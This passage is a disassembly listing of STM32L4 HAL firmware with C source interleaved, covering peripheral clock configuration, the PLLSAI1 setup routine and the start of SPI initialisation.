 800483c:	f443 1380 	orr.w	r3, r3, #1048576	; 0x100000
 8004840:	60d3      	str	r3, [r2, #12]
 8004842:	e011      	b.n	8004868 <HAL_RCCEx_PeriphCLKConfig+0x374>
    }
#if defined(RCC_PLLSAI1_SUPPORT)
    else if(PeriphClkInit->RngClockSelection == RCC_RNGCLKSOURCE_PLLSAI1)
 8004844:	687b      	ldr	r3, [r7, #4]
 8004846:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 8004848:	f1b3 6f80 	cmp.w	r3, #67108864	; 0x4000000
 800484c:	d10c      	bne.n	8004868 <HAL_RCCEx_PeriphCLKConfig+0x374>
    {
      /* PLLSAI1 input clock, parameters M, N & Q configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_Q_UPDATE);
 800484e:	687b      	ldr	r3, [r7, #4]
 8004850:	3304      	adds	r3, #4
 8004852:	2101      	movs	r1, #1
 8004854:	4618      	mov	r0, r3
 8004856:	f000 f853 	bl	8004900 <RCCEx_PLLSAI1_Config>
 800485a:	4603      	mov	r3, r0
 800485c:	74fb      	strb	r3, [r7, #19]

      if(ret != HAL_OK)
 800485e:	7cfb      	ldrb	r3, [r7, #19]
 8004860:	2b00      	cmp	r3, #0
 8004862:	d001      	beq.n	8004868 <HAL_RCCEx_PeriphCLKConfig+0x374>
      {
        /* set overall return value */
        status = ret;
 8004864:	7cfb      	ldrb	r3, [r7, #19]
 8004866:	74bb      	strb	r3, [r7, #18]
    }
  }

  /*-------------------------- ADC clock source configuration ----------------------*/
#if !defined(STM32L412xx) && !defined(STM32L422xx)
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_ADC) == RCC_PERIPHCLK_ADC)
 8004868:	687b      	ldr	r3, [r7, #4]
 800486a:	681b      	ldr	r3, [r3, #0]
 800486c:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8004870:	2b00      	cmp	r3, #0
 8004872:	d01c      	beq.n	80048ae <HAL_RCCEx_PeriphCLKConfig+0x3ba>
  {
    /* Check the parameters */
    assert_param(IS_RCC_ADCCLKSOURCE(PeriphClkInit->AdcClockSelection));

    /* Configure the ADC interface clock source */
    __HAL_RCC_ADC_CONFIG(PeriphClkInit->AdcClockSelection);
 8004874:	4b19      	ldr	r3, [pc, #100]	; (80048dc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004876:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800487a:	f023 5240 	bic.w	r2, r3, #805306368	; 0x30000000
 800487e:	687b      	ldr	r3, [r7, #4]
 8004880:	6c9b      	ldr	r3, [r3, #72]	; 0x48
 8004882:	4916      	ldr	r1, [pc, #88]	; (80048dc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004884:	4313      	orrs	r3, r2
 8004886:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

#if defined(RCC_PLLSAI1_SUPPORT)
    if(PeriphClkInit->AdcClockSelection == RCC_ADCCLKSOURCE_PLLSAI1)
 800488a:	687b      	ldr	r3, [r7, #4]
 800488c:	6c9b      	ldr	r3, [r3, #72]	; 0x48
 800488e:	f1b3 5f80 	cmp.w	r3, #268435456	; 0x10000000
 8004892:	d10c      	bne.n	80048ae <HAL_RCCEx_PeriphCLKConfig+0x3ba>
    {
      /* PLLSAI1 input clock, parameters M, N & R configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_R_UPDATE);
 8004894:	687b      	ldr	r3, [r7, #4]
 8004896:	3304      	adds	r3, #4
 8004898:	2102      	movs	r1, #2
 800489a:	4618      	mov	r0, r3
 800489c:	f000 f830 	bl	8004900 <RCCEx_PLLSAI1_Config>
 80048a0:	4603      	mov	r3, r0
 80048a2:	74fb      	strb	r3, [r7, #19]

      if(ret != HAL_OK)
 80048a4:	7cfb      	ldrb	r3, [r7, #19]
 80048a6:	2b00      	cmp	r3, #0
 80048a8:	d001      	beq.n	80048ae <HAL_RCCEx_PeriphCLKConfig+0x3ba>
      {
        /* set overall return value */
        status = ret;
 80048aa:	7cfb      	ldrb	r3, [r7, #19]
 80048ac:	74bb      	strb	r3, [r7, #18]
#endif /* !STM32L412xx && !STM32L422xx */

#if defined(SWPMI1)

  /*-------------------------- SWPMI1 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_SWPMI1) == RCC_PERIPHCLK_SWPMI1)
 80048ae:	687b      	ldr	r3, [r7, #4]
 80048b0:	681b      	ldr	r3, [r3, #0]
 80048b2:	f403 4300 	and.w	r3, r3, #32768	; 0x8000
 80048b6:	2b00      	cmp	r3, #0
 80048b8:	d00a      	beq.n	80048d0 <HAL_RCCEx_PeriphCLKConfig+0x3dc>
  {
    /* Check the parameters */
    assert_param(IS_RCC_SWPMI1CLKSOURCE(PeriphClkInit->Swpmi1ClockSelection));

    /* Configure the SWPMI1 clock source */
    __HAL_RCC_SWPMI1_CONFIG(PeriphClkInit->Swpmi1ClockSelection);
 80048ba:	4b08      	ldr	r3, [pc, #32]	; (80048dc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80048bc:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80048c0:	f023 4280 	bic.w	r2, r3, #1073741824	; 0x40000000
 80048c4:	687b      	ldr	r3, [r7, #4]
 80048c6:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 80048c8:	4904      	ldr	r1, [pc, #16]	; (80048dc <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80048ca:	4313      	orrs	r3, r2
 80048cc:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
    }
  }

#endif /* OCTOSPI1 || OCTOSPI2 */

  return status;
 80048d0:	7cbb      	ldrb	r3, [r7, #18]
}
 80048d2:	4618      	mov	r0, r3
 80048d4:	3718      	adds	r7, #24
 80048d6:	46bd      	mov	sp, r7
 80048d8:	bd80      	pop	{r7, pc}
 80048da:	bf00      	nop
 80048dc:	40021000 	.word	0x40021000

080048e0 <HAL_RCCEx_EnableMSIPLLMode>:
  * @note   Prior to enable the PLL-mode of the MSI for automatic hardware
  *         calibration LSE oscillator is to be enabled with HAL_RCC_OscConfig().
  * @retval None
  */
void HAL_RCCEx_EnableMSIPLLMode(void)
{
 80048e0:	b480      	push	{r7}
 80048e2:	af00      	add	r7, sp, #0
  SET_BIT(RCC->CR, RCC_CR_MSIPLLEN) ;
 80048e4:	4b05      	ldr	r3, [pc, #20]	; (80048fc <HAL_RCCEx_EnableMSIPLLMode+0x1c>)
 80048e6:	681b      	ldr	r3, [r3, #0]
 80048e8:	4a04      	ldr	r2, [pc, #16]	; (80048fc <HAL_RCCEx_EnableMSIPLLMode+0x1c>)
 80048ea:	f043 0304 	orr.w	r3, r3, #4
 80048ee:	6013      	str	r3, [r2, #0]
}
 80048f0:	bf00      	nop
 80048f2:	46bd      	mov	sp, r7
 80048f4:	f85d 7b04 	ldr.w	r7, [sp], #4
 80048f8:	4770      	bx	lr
 80048fa:	bf00      	nop
 80048fc:	40021000 	.word	0x40021000

08004900 <RCCEx_PLLSAI1_Config>:
  * @note   PLLSAI1 is temporary disable to apply new parameters
  *
  * @retval HAL status
  */
static HAL_StatusTypeDef RCCEx_PLLSAI1_Config(RCC_PLLSAI1InitTypeDef *PllSai1, uint32_t Divider)
{
 8004900:	b580      	push	{r7, lr}
 8004902:	b084      	sub	sp, #16
 8004904:	af00      	add	r7, sp, #0
 8004906:	6078      	str	r0, [r7, #4]
 8004908:	6039      	str	r1, [r7, #0]
  uint32_t tickstart;
  HAL_StatusTypeDef status = HAL_OK;
 800490a:	2300      	movs	r3, #0
 800490c:	73fb      	strb	r3, [r7, #15]
  assert_param(IS_RCC_PLLSAI1M_VALUE(PllSai1->PLLSAI1M));
  assert_param(IS_RCC_PLLSAI1N_VALUE(PllSai1->PLLSAI1N));
  assert_param(IS_RCC_PLLSAI1CLOCKOUT_VALUE(PllSai1->PLLSAI1ClockOut));

  /* Check that PLLSAI1 clock source and divider M can be applied */
  if(__HAL_RCC_GET_PLL_OSCSOURCE() != RCC_PLLSOURCE_NONE)
 800490e:	4b74      	ldr	r3, [pc, #464]	; (8004ae0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004910:	68db      	ldr	r3, [r3, #12]
 8004912:	f003 0303 	and.w	r3, r3, #3
 8004916:	2b00      	cmp	r3, #0
 8004918:	d018      	beq.n	800494c <RCCEx_PLLSAI1_Config+0x4c>
  {
    /* PLL clock source and divider M already set, check that no request for change  */
    if((__HAL_RCC_GET_PLL_OSCSOURCE() != PllSai1->PLLSAI1Source)
 800491a:	4b71      	ldr	r3, [pc, #452]	; (8004ae0 <RCCEx_PLLSAI1_Config+0x1e0>)
 800491c:	68db      	ldr	r3, [r3, #12]
 800491e:	f003 0203 	and.w	r2, r3, #3
 8004922:	687b      	ldr	r3, [r7, #4]
 8004924:	681b      	ldr	r3, [r3, #0]
 8004926:	429a      	cmp	r2, r3
 8004928:	d10d      	bne.n	8004946 <RCCEx_PLLSAI1_Config+0x46>
       ||
       (PllSai1->PLLSAI1Source == RCC_PLLSOURCE_NONE)
 800492a:	687b      	ldr	r3, [r7, #4]
 800492c:	681b      	ldr	r3, [r3, #0]
       ||
 800492e:	2b00      	cmp	r3, #0
 8004930:	d009      	beq.n	8004946 <RCCEx_PLLSAI1_Config+0x46>
#if !defined(RCC_PLLSAI1M_DIV_1_16_SUPPORT)
       ||
       (((READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLM) >> RCC_PLLCFGR_PLLM_Pos) + 1U) != PllSai1->PLLSAI1M)
 8004932:	4b6b      	ldr	r3, [pc, #428]	; (8004ae0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004934:	68db      	ldr	r3, [r3, #12]
 8004936:	091b      	lsrs	r3, r3, #4
 8004938:	f003 0307 	and.w	r3, r3, #7
 800493c:	1c5a      	adds	r2, r3, #1
 800493e:	687b      	ldr	r3, [r7, #4]
 8004940:	685b      	ldr	r3, [r3, #4]
       ||
 8004942:	429a      	cmp	r2, r3
 8004944:	d047      	beq.n	80049d6 <RCCEx_PLLSAI1_Config+0xd6>
#endif
      )
    {
      status = HAL_ERROR;
 8004946:	2301      	movs	r3, #1
 8004948:	73fb      	strb	r3, [r7, #15]
 800494a:	e044      	b.n	80049d6 <RCCEx_PLLSAI1_Config+0xd6>
    }
  }
  else
  {
    /* Check PLLSAI1 clock source availability */
    switch(PllSai1->PLLSAI1Source)
 800494c:	687b      	ldr	r3, [r7, #4]
 800494e:	681b      	ldr	r3, [r3, #0]
 8004950:	2b03      	cmp	r3, #3
 8004952:	d018      	beq.n	8004986 <RCCEx_PLLSAI1_Config+0x86>
 8004954:	2b03      	cmp	r3, #3
 8004956:	d825      	bhi.n	80049a4 <RCCEx_PLLSAI1_Config+0xa4>
 8004958:	2b01      	cmp	r3, #1
 800495a:	d002      	beq.n	8004962 <RCCEx_PLLSAI1_Config+0x62>
 800495c:	2b02      	cmp	r3, #2
 800495e:	d009      	beq.n	8004974 <RCCEx_PLLSAI1_Config+0x74>
 8004960:	e020      	b.n	80049a4 <RCCEx_PLLSAI1_Config+0xa4>
    {
    case RCC_PLLSOURCE_MSI:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_MSIRDY))
 8004962:	4b5f      	ldr	r3, [pc, #380]	; (8004ae0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004964:	681b      	ldr	r3, [r3, #0]
 8004966:	f003 0302 	and.w	r3, r3, #2
 800496a:	2b00      	cmp	r3, #0
 800496c:	d11d      	bne.n	80049aa <RCCEx_PLLSAI1_Config+0xaa>
      {
        status = HAL_ERROR;
 800496e:	2301      	movs	r3, #1
 8004970:	73fb      	strb	r3, [r7, #15]
      }
      break;
 8004972:	e01a      	b.n	80049aa <RCCEx_PLLSAI1_Config+0xaa>
    case RCC_PLLSOURCE_HSI:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSIRDY))
 8004974:	4b5a      	ldr	r3, [pc, #360]	; (8004ae0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004976:	681b      	ldr	r3, [r3, #0]
 8004978:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 800497c:	2b00      	cmp	r3, #0
 800497e:	d116      	bne.n	80049ae <RCCEx_PLLSAI1_Config+0xae>
      {
        status = HAL_ERROR;
 8004980:	2301      	movs	r3, #1
 8004982:	73fb      	strb	r3, [r7, #15]
      }
      break;
 8004984:	e013      	b.n	80049ae <RCCEx_PLLSAI1_Config+0xae>
    case RCC_PLLSOURCE_HSE:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSERDY))
 8004986:	4b56      	ldr	r3, [pc, #344]	; (8004ae0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004988:	681b      	ldr	r3, [r3, #0]
 800498a:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 800498e:	2b00      	cmp	r3, #0
 8004990:	d10f      	bne.n	80049b2 <RCCEx_PLLSAI1_Config+0xb2>
      {
        if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSEBYP))
 8004992:	4b53      	ldr	r3, [pc, #332]	; (8004ae0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004994:	681b      	ldr	r3, [r3, #0]
 8004996:	f403 2380 	and.w	r3, r3, #262144	; 0x40000
 800499a:	2b00      	cmp	r3, #0
 800499c:	d109      	bne.n	80049b2 <RCCEx_PLLSAI1_Config+0xb2>
        {
          status = HAL_ERROR;
 800499e:	2301      	movs	r3, #1
 80049a0:	73fb      	strb	r3, [r7, #15]
        }
      }
      break;
 80049a2:	e006      	b.n	80049b2 <RCCEx_PLLSAI1_Config+0xb2>
    default:
      status = HAL_ERROR;
 80049a4:	2301      	movs	r3, #1
 80049a6:	73fb      	strb	r3, [r7, #15]
      break;
 80049a8:	e004      	b.n	80049b4 <RCCEx_PLLSAI1_Config+0xb4>
      break;
 80049aa:	bf00      	nop
 80049ac:	e002      	b.n	80049b4 <RCCEx_PLLSAI1_Config+0xb4>
      break;
 80049ae:	bf00      	nop
 80049b0:	e000      	b.n	80049b4 <RCCEx_PLLSAI1_Config+0xb4>
      break;
 80049b2:	bf00      	nop
    }

    if(status == HAL_OK)
 80049b4:	7bfb      	ldrb	r3, [r7, #15]
 80049b6:	2b00      	cmp	r3, #0
 80049b8:	d10d      	bne.n	80049d6 <RCCEx_PLLSAI1_Config+0xd6>
#if defined(RCC_PLLSAI1M_DIV_1_16_SUPPORT)
      /* Set PLLSAI1 clock source */
      MODIFY_REG(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC, PllSai1->PLLSAI1Source);
#else
      /* Set PLLSAI1 clock source and divider M */
      MODIFY_REG(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC | RCC_PLLCFGR_PLLM, PllSai1->PLLSAI1Source | (PllSai1->PLLSAI1M - 1U) << RCC_PLLCFGR_PLLM_Pos);
 80049ba:	4b49      	ldr	r3, [pc, #292]	; (8004ae0 <RCCEx_PLLSAI1_Config+0x1e0>)
 80049bc:	68db      	ldr	r3, [r3, #12]
 80049be:	f023 0273 	bic.w	r2, r3, #115	; 0x73
 80049c2:	687b      	ldr	r3, [r7, #4]
 80049c4:	6819      	ldr	r1, [r3, #0]
 80049c6:	687b      	ldr	r3, [r7, #4]
 80049c8:	685b      	ldr	r3, [r3, #4]
 80049ca:	3b01      	subs	r3, #1
 80049cc:	011b      	lsls	r3, r3, #4
 80049ce:	430b      	orrs	r3, r1
 80049d0:	4943      	ldr	r1, [pc, #268]	; (8004ae0 <RCCEx_PLLSAI1_Config+0x1e0>)
 80049d2:	4313      	orrs	r3, r2
 80049d4:	60cb      	str	r3, [r1, #12]
#endif
    }
  }

  if(status == HAL_OK)
 80049d6:	7bfb      	ldrb	r3, [r7, #15]
 80049d8:	2b00      	cmp	r3, #0
 80049da:	d17c      	bne.n	8004ad6 <RCCEx_PLLSAI1_Config+0x1d6>
  {
    /* Disable the PLLSAI1 */
    __HAL_RCC_PLLSAI1_DISABLE();
 80049dc:	4b40      	ldr	r3, [pc, #256]	; (8004ae0 <RCCEx_PLLSAI1_Config+0x1e0>)
 80049de:	681b      	ldr	r3, [r3, #0]
 80049e0:	4a3f      	ldr	r2, [pc, #252]	; (8004ae0 <RCCEx_PLLSAI1_Config+0x1e0>)
 80049e2:	f023 6380 	bic.w	r3, r3, #67108864	; 0x4000000
 80049e6:	6013      	str	r3, [r2, #0]

    /* Get Start Tick*/
    tickstart = HAL_GetTick();
 80049e8:	f7fc fbc8 	bl	800117c <HAL_GetTick>
 80049ec:	60b8      	str	r0, [r7, #8]

    /* Wait till PLLSAI1 is ready to be updated */
    while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) != 0U)
 80049ee:	e009      	b.n	8004a04 <RCCEx_PLLSAI1_Config+0x104>
    {
      if((HAL_GetTick() - tickstart) > PLLSAI1_TIMEOUT_VALUE)
 80049f0:	f7fc fbc4 	bl	800117c <HAL_GetTick>
 80049f4:	4602      	mov	r2, r0
 80049f6:	68bb      	ldr	r3, [r7, #8]
 80049f8:	1ad3      	subs	r3, r2, r3
 80049fa:	2b02      	cmp	r3, #2
 80049fc:	d902      	bls.n	8004a04 <RCCEx_PLLSAI1_Config+0x104>
      {
        status = HAL_TIMEOUT;
 80049fe:	2303      	movs	r3, #3
 8004a00:	73fb      	strb	r3, [r7, #15]
        break;
 8004a02:	e005      	b.n	8004a10 <RCCEx_PLLSAI1_Config+0x110>
    while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) != 0U)
 8004a04:	4b36      	ldr	r3, [pc, #216]	; (8004ae0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a06:	681b      	ldr	r3, [r3, #0]
 8004a08:	f003 6300 	and.w	r3, r3, #134217728	; 0x8000000
 8004a0c:	2b00      	cmp	r3, #0
 8004a0e:	d1ef      	bne.n	80049f0 <RCCEx_PLLSAI1_Config+0xf0>
      }
    }

    if(status == HAL_OK)
 8004a10:	7bfb      	ldrb	r3, [r7, #15]
 8004a12:	2b00      	cmp	r3, #0
 8004a14:	d15f      	bne.n	8004ad6 <RCCEx_PLLSAI1_Config+0x1d6>
    {
      if(Divider == DIVIDER_P_UPDATE)
 8004a16:	683b      	ldr	r3, [r7, #0]
 8004a18:	2b00      	cmp	r3, #0
 8004a1a:	d110      	bne.n	8004a3e <RCCEx_PLLSAI1_Config+0x13e>
#endif /* RCC_PLLSAI1P_DIV_2_31_SUPPORT */

#else
        /* Configure the PLLSAI1 Division factor P and Multiplication factor N*/
#if defined(RCC_PLLSAI1P_DIV_2_31_SUPPORT)
        MODIFY_REG(RCC->PLLSAI1CFGR,
 8004a1c:	4b30      	ldr	r3, [pc, #192]	; (8004ae0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a1e:	691b      	ldr	r3, [r3, #16]
 8004a20:	f023 4378 	bic.w	r3, r3, #4160749568	; 0xf8000000
 8004a24:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 8004a28:	687a      	ldr	r2, [r7, #4]
 8004a2a:	6892      	ldr	r2, [r2, #8]
 8004a2c:	0211      	lsls	r1, r2, #8
 8004a2e:	687a      	ldr	r2, [r7, #4]
 8004a30:	68d2      	ldr	r2, [r2, #12]
 8004a32:	06d2      	lsls	r2, r2, #27
 8004a34:	430a      	orrs	r2, r1
 8004a36:	492a      	ldr	r1, [pc, #168]	; (8004ae0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a38:	4313      	orrs	r3, r2
 8004a3a:	610b      	str	r3, [r1, #16]
 8004a3c:	e027      	b.n	8004a8e <RCCEx_PLLSAI1_Config+0x18e>
                   ((PllSai1->PLLSAI1P >> 4U) << RCC_PLLSAI1CFGR_PLLSAI1P_Pos));
#endif /* RCC_PLLSAI1P_DIV_2_31_SUPPORT */

#endif /* RCC_PLLSAI1M_DIV_1_16_SUPPORT */
      }
      else if(Divider == DIVIDER_Q_UPDATE)
 8004a3e:	683b      	ldr	r3, [r7, #0]
 8004a40:	2b01      	cmp	r3, #1
 8004a42:	d112      	bne.n	8004a6a <RCCEx_PLLSAI1_Config+0x16a>
                   (PllSai1->PLLSAI1N << RCC_PLLSAI1CFGR_PLLSAI1N_Pos) |
                   (((PllSai1->PLLSAI1Q >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1Q_Pos) |
                   ((PllSai1->PLLSAI1M - 1U) << RCC_PLLSAI1CFGR_PLLSAI1M_Pos));
#else
        /* Configure the PLLSAI1 Division factor Q and Multiplication factor N*/
        MODIFY_REG(RCC->PLLSAI1CFGR,
 8004a44:	4b26      	ldr	r3, [pc, #152]	; (8004ae0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a46:	691b      	ldr	r3, [r3, #16]
 8004a48:	f423 03c0 	bic.w	r3, r3, #6291456	; 0x600000
 8004a4c:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 8004a50:	687a      	ldr	r2, [r7, #4]
 8004a52:	6892      	ldr	r2, [r2, #8]
 8004a54:	0211      	lsls	r1, r2, #8
 8004a56:	687a      	ldr	r2, [r7, #4]
 8004a58:	6912      	ldr	r2, [r2, #16]
 8004a5a:	0852      	lsrs	r2, r2, #1
 8004a5c:	3a01      	subs	r2, #1
 8004a5e:	0552      	lsls	r2, r2, #21
 8004a60:	430a      	orrs	r2, r1
 8004a62:	491f      	ldr	r1, [pc, #124]	; (8004ae0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a64:	4313      	orrs	r3, r2
 8004a66:	610b      	str	r3, [r1, #16]
 8004a68:	e011      	b.n	8004a8e <RCCEx_PLLSAI1_Config+0x18e>
                   (PllSai1->PLLSAI1N << RCC_PLLSAI1CFGR_PLLSAI1N_Pos) |
                   (((PllSai1->PLLSAI1R >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1R_Pos) |
                   ((PllSai1->PLLSAI1M - 1U) << RCC_PLLSAI1CFGR_PLLSAI1M_Pos));
#else
        /* Configure the PLLSAI1 Division factor R and Multiplication factor N*/
        MODIFY_REG(RCC->PLLSAI1CFGR,
 8004a6a:	4b1d      	ldr	r3, [pc, #116]	; (8004ae0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a6c:	691b      	ldr	r3, [r3, #16]
 8004a6e:	f023 63c0 	bic.w	r3, r3, #100663296	; 0x6000000
 8004a72:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 8004a76:	687a      	ldr	r2, [r7, #4]
 8004a78:	6892      	ldr	r2, [r2, #8]
 8004a7a:	0211      	lsls	r1, r2, #8
 8004a7c:	687a      	ldr	r2, [r7, #4]
 8004a7e:	6952      	ldr	r2, [r2, #20]
 8004a80:	0852      	lsrs	r2, r2, #1
 8004a82:	3a01      	subs	r2, #1
 8004a84:	0652      	lsls	r2, r2, #25
 8004a86:	430a      	orrs	r2, r1
 8004a88:	4915      	ldr	r1, [pc, #84]	; (8004ae0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a8a:	4313      	orrs	r3, r2
 8004a8c:	610b      	str	r3, [r1, #16]
                   (((PllSai1->PLLSAI1R >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1R_Pos));
#endif /* RCC_PLLSAI1M_DIV_1_16_SUPPORT */
      }

      /* Enable the PLLSAI1 again by setting PLLSAI1ON to 1*/
      __HAL_RCC_PLLSAI1_ENABLE();
 8004a8e:	4b14      	ldr	r3, [pc, #80]	; (8004ae0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a90:	681b      	ldr	r3, [r3, #0]
 8004a92:	4a13      	ldr	r2, [pc, #76]	; (8004ae0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a94:	f043 6380 	orr.w	r3, r3, #67108864	; 0x4000000
 8004a98:	6013      	str	r3, [r2, #0]

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8004a9a:	f7fc fb6f 	bl	800117c <HAL_GetTick>
 8004a9e:	60b8      	str	r0, [r7, #8]

      /* Wait till PLLSAI1 is ready */
      while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) == 0U)
 8004aa0:	e009      	b.n	8004ab6 <RCCEx_PLLSAI1_Config+0x1b6>
      {
        if((HAL_GetTick() - tickstart) > PLLSAI1_TIMEOUT_VALUE)
 8004aa2:	f7fc fb6b 	bl	800117c <HAL_GetTick>
 8004aa6:	4602      	mov	r2, r0
 8004aa8:	68bb      	ldr	r3, [r7, #8]
 8004aaa:	1ad3      	subs	r3, r2, r3
 8004aac:	2b02      	cmp	r3, #2
 8004aae:	d902      	bls.n	8004ab6 <RCCEx_PLLSAI1_Config+0x1b6>
        {
          status = HAL_TIMEOUT;
 8004ab0:	2303      	movs	r3, #3
 8004ab2:	73fb      	strb	r3, [r7, #15]
          break;
 8004ab4:	e005      	b.n	8004ac2 <RCCEx_PLLSAI1_Config+0x1c2>
      while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) == 0U)
 8004ab6:	4b0a      	ldr	r3, [pc, #40]	; (8004ae0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004ab8:	681b      	ldr	r3, [r3, #0]
 8004aba:	f003 6300 	and.w	r3, r3, #134217728	; 0x8000000
 8004abe:	2b00      	cmp	r3, #0
 8004ac0:	d0ef      	beq.n	8004aa2 <RCCEx_PLLSAI1_Config+0x1a2>
        }
      }

      if(status == HAL_OK)
 8004ac2:	7bfb      	ldrb	r3, [r7, #15]
 8004ac4:	2b00      	cmp	r3, #0
 8004ac6:	d106      	bne.n	8004ad6 <RCCEx_PLLSAI1_Config+0x1d6>
      {
        /* Configure the PLLSAI1 Clock output(s) */
        __HAL_RCC_PLLSAI1CLKOUT_ENABLE(PllSai1->PLLSAI1ClockOut);
 8004ac8:	4b05      	ldr	r3, [pc, #20]	; (8004ae0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004aca:	691a      	ldr	r2, [r3, #16]
 8004acc:	687b      	ldr	r3, [r7, #4]
 8004ace:	699b      	ldr	r3, [r3, #24]
 8004ad0:	4903      	ldr	r1, [pc, #12]	; (8004ae0 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004ad2:	4313      	orrs	r3, r2
 8004ad4:	610b      	str	r3, [r1, #16]
      }
    }
  }

  return status;
 8004ad6:	7bfb      	ldrb	r3, [r7, #15]
}
 8004ad8:	4618      	mov	r0, r3
 8004ada:	3710      	adds	r7, #16
 8004adc:	46bd      	mov	sp, r7
 8004ade:	bd80      	pop	{r7, pc}
 8004ae0:	40021000 	.word	0x40021000

08004ae4 <HAL_SPI_Init>:
  * @param  hspi pointer to a SPI_HandleTypeDef structure that contains
  *               the configuration information for SPI module.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_SPI_Init(SPI_HandleTypeDef *hspi)
{
 8004ae4:	b580      	push	{r7, lr}
 8004ae6:	b084      	sub	sp, #16
 8004ae8:	af00      	add	r7, sp, #0
 8004aea:	6078      	str	r0, [r7, #4]
  uint32_t frxth;

  /* Check the SPI handle allocation */
  if (hspi == NULL)
 8004aec:	687b      	ldr	r3, [r7, #4]
 8004aee:	2b00      	cmp	r3, #0
 8004af0:	d101      	bne.n	8004af6 <HAL_SPI_Init+0x12>
  {
    return HAL_ERROR;
 8004af2:	2301      	movs	r3, #1
 8004af4:	e095      	b.n	8004c22 <HAL_SPI_Init+0x13e>
  assert_param(IS_SPI_NSS(hspi->Init.NSS));
  assert_param(IS_SPI_NSSP(hspi->Init.NSSPMode));
  assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));
  assert_param(IS_SPI_FIRST_BIT(hspi->Init.FirstBit));
  assert_param(IS_SPI_TIMODE(hspi->Init.TIMode));
  if (hspi->Init.TIMode == SPI_TIMODE_DISABLE)
 8004af6:	687b      	ldr	r3, [r7, #4]
 8004af8:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8004afa:	2b00      	cmp	r3, #0
 8004afc:	d108      	bne.n	8004b10 <HAL_SPI_Init+0x2c>
  {
    assert_param(IS_SPI_CPOL(hspi->Init.CLKPolarity));
    assert_param(IS_SPI_CPHA(hspi->Init.CLKPhase));

    if (hspi->Init.Mode == SPI_MODE_MASTER)
 8004afe:	687b      	ldr	r3, [r7, #4]
 8004b00:	685b      	ldr	r3, [r3, #4]
 8004b02:	f5b3 7f82 	cmp.w	r3, #260	; 0x104
 8004b06:	d009      	beq.n	8004b1c <HAL_SPI_Init+0x38>
      assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));
    }
    else
    {
      /* Baudrate prescaler not use in Motoraola Slave mode. force to default value */
      hspi->Init.BaudRatePrescaler = SPI_BAUDRATEPRESCALER_2;
 8004b08:	687b      	ldr	r3, [r7, #4]
 8004b0a:	2200      	movs	r2, #0
 8004b0c:	61da      	str	r2, [r3, #28]
 8004b0e:	e005      	b.n	8004b1c <HAL_SPI_Init+0x38>
  else
  {
    assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));

    /* Force polarity and phase to TI protocaol requirements */
    hspi->Init.CLKPolarity = SPI_POLARITY_LOW;
 8004b10:	687b      	ldr	r3, [r7, #4]
 8004b12:	2200      	movs	r2, #0
 8004b14:	611a      	str	r2, [r3, #16]
    hspi->Init.CLKPhase    = SPI_PHASE_1EDGE;
 8004b16:	687b      	ldr	r3, [r7, #4]
 8004b18:	2200      	movs	r2, #0
 8004b1a:	615a      	str	r2, [r3, #20]
  {
    assert_param(IS_SPI_CRC_POLYNOMIAL(hspi->Init.CRCPolynomial));
